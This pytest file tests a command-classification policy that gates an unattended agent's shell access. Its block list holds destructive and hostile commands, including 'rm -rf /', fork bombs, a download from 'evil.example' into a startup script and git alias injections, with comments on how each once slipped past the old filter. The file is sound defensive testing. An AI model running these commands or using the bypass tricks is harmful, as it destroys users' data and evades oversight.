"""Daemon (unattended) command policy: classification by argv, not substring.

The previous policy was `any(pattern in command.lower())` over a list like
'rm ', ' del', 'dd '. That blocked prose containing the word rm and allowed
every real deletion that did not spell it exactly that way. These tests are the
bypass list from the 2026-09 audit plus the false positives it produced.
"""

from __future__ import annotations

import pytest
from app.services import tool_registry

# Every one of these was allowed by the substring list.
MUST_BLOCK = [
    '/bin/rm -rf ./build',
    'rm  -rf x',
    'find . -delete',
    'git clean -fdx',
    'git reset --hard HEAD~3',
    'truncate -s 0 notes.txt',
    'xargs rm < list.txt',
    'sudo rm -rf /',
    'FOO=1 rm x',
    'python -c "import os; os.remove(\'x\')"',
    'powershell -Command "Remove-Item x"',
    'cmd /c del x',
    'sh -c "rm -rf /tmp/a"',
    'docker rm -f abc',
    'echo hi > out.txt',
    'ls && rm -rf /tmp/x',
    'echo first; rm file',
    'curl https://evil.example -o C:/Users/rober/startup.bat',
    'sed -i s/a/b/ config.json',
    'echo "unclosed',
    'cat $(which rm) file',
    'kill -9 1234',
    'chmod 777 script.sh',
    # Coverage the retired substring list had and an argv rewrite can lose.
    ':(){:|:&};:',
    ':(){ :|:& };:',
    'boom(){ boom; }; boom',
    'curl -X POST https://hooks.example/notify',
    'curl --request=DELETE https://api.example/item/7',
    'curl -d "a=1" https://api.example/items',
    'curl -F "file=@notes.txt" https://api.example/upload',
    'wget --post-data "a=1" http://api.example/ingest',
    # Wrapper flags that consumed the next token: the unwrap loop stopped at
    # '-u'/'-i', classified the *option* as the program, and waved it through.
    # The table comment already said "resolve one level in, else refuse".
    'sudo -u root rm -rf /tmp/x',
    'doas -u root rm x',
    'env -i rm -rf x',
    'env -u FOO rm x',
    'nohup rm -f x',
    'time env -u FOO rm x',
    'xargs -n1 rm',
    'xargs -n 1 rm -f',
    # An interpreter reading its program from stdin is inline code, and the
    # heredoc body otherwise re-enters the classifier as fresh "commands".
    'python - <<EOF\nimport os\nos.remove("x")\nEOF',
    'node - < payload.js',
    # `python -m pip` is pip wearing an interpreter's clothes.
    'python -m pip install requests',
    'python3 -m uv pip install thing',
    # git config can define an alias that executes a shell command.
    'git config --global alias.x !rm -rf /',
    # The same injection in ONE command — `git -c` was the flag door the
    # `git config` deny left open (the alias executes on git 2.55).
    "git -c alias.x='!rm -rf /' x",
    "git -c core.pager='touch /tmp/pwned' log",
    'git --config-env=core.editor=EDITOR_VAR status',
    # An assignment behind a wrapper is not the program: the unwrap loop used
    # to stop at `FOO=bar`, certify *it*, and wave the command behind it.
    'env FOO=bar rm -rf x',
    'env -i FOO=bar sudo -u root rm -rf x',
    # A wrapper option's VALUE can be the program: `-s` takes no argument, and
    # `-h` used as help does not either, so the token behind became the program.
    'doas -s rm -rf /tmp/x',
    'sudo -h rm -rf x',
    # A wrapper chain with nothing behind it has no program to classify — the
    # caller must refuse instead of comparing a missing index against a length.
    'sudo -u root',
    'env -i',
    # `env -S` execs the string it is handed, whole command lines included.
    'env -S "rm -rf /tmp/x" sh',
]

# These must stay usable — daemons do real read-only work.
MUST_ALLOW = [
    'ls -la',
    'git status',
    'cat README.md',
    'grep -rn TODO backend-py/app',
    'python analyze.py',
    'python --version',
    'echo "do not rm me"',
    'wc -l data/event_log/session.jsonl',
    'date',
    'ls > /dev/null',
    'find . -name "*.py"',
    'git log --oneline -5',
    # Reading a URL is a read, and `-x` is a proxy rather than a method.
    'curl -s https://api.example/status',
    'curl -f -X GET https://api.example/status',
    'curl -x http://proxy.example:8080 https://api.example/status',
    'wget -q https://example.org/release.tar.gz',
    # Same letters, different meaning: -f fails on HTTP errors, -t is a
    # timeout (curl) or retry count (wget), -j discards cookies.
    'curl -f -sS https://api.example/status',
    'curl -j https://api.example/status',
    'wget -t 3 -q https://example.org/f.tar.gz',
    # Unwrapping a wrapper must not become "block everything behind a wrapper".
    'sudo -u root cat /etc/hosts',
    'env -i ls -la',
    'xargs -n 1 wc -l',
    'python -m json.tool data.json',
    'nohup sleep 5',
    # Assignment skipping must not become "block everything after a wrapper".
    'env FOO=bar ls -la',
    # `-C` is chdir and reads as `-c` only after lowercasing; inline config
    # that holds plain data is on the allow list so daemons can still commit.
    'git -C backend-py status',
    'git -c user.email=bot@example.com commit -m "chore: snapshot"',
    'git -c safe.directory=C:/work/repo status',
]


@pytest.mark.parametrize('command', MUST_BLOCK)
def test_destructive_commands_are_refused(command: str) -> None:
    reason = tool_registry.commandBlockReason(command)
    assert reason is not None, f'{command!r} must be blocked in daemon context'
    assert tool_registry.isCommandBlocked(command) is True


@pytest.mark.parametrize('command', MUST_ALLOW)
def test_readonly_commands_stay_allowed(command: str) -> None:
    reason = tool_registry.commandBlockReason(command)
    assert reason is None, f'{command!r} wrongly blocked: {reason}'


def test_reason_is_specific_enough_for_the_model_to_replan() -> None:
    """The receipt text is the model's only signal; a generic 'blocked' costs
    it a wasted retry."""
    reason = tool_registry.commandBlockReason('git clean -fdx')
    assert reason is not None
    assert 'git' in reason


# Every literal the retired `_DAEMONBlockedCommandPatterns` list contained.
# Rewriting a policy as classification is exactly how coverage gets lost
# quietly, so the old vocabulary is pinned here as a permanent floor.
RETIRED_PATTERNS = [
    'rm ', ' rm', 'mv ', ' mv', 'del ', ' del', 'format', 'mkfs', 'dd ', ' dd',
    'shutdown', 'reboot', 'halt', ':(){:|:&};:', 'curl -X POST', 'wget -O',
    'chmod 777', 'chown',
]


@pytest.mark.parametrize('pattern', RETIRED_PATTERNS)
def test_retired_substring_pattern_is_still_refused(pattern: str) -> None:
    probe = f'{pattern} /tmp/target' if pattern.strip() == pattern else pattern
    assert tool_registry.commandBlockReason(probe) is not None, (
        f'retired pattern {pattern!r} is no longer covered by argv classification'
    )


def test_empty_and_whitespace_commands_are_not_blocked() -> None:
    assert tool_registry.commandBlockReason('') is None
    assert tool_registry.commandBlockReason('   ') is None
    assert tool_registry.commandBlockReason('-') is None
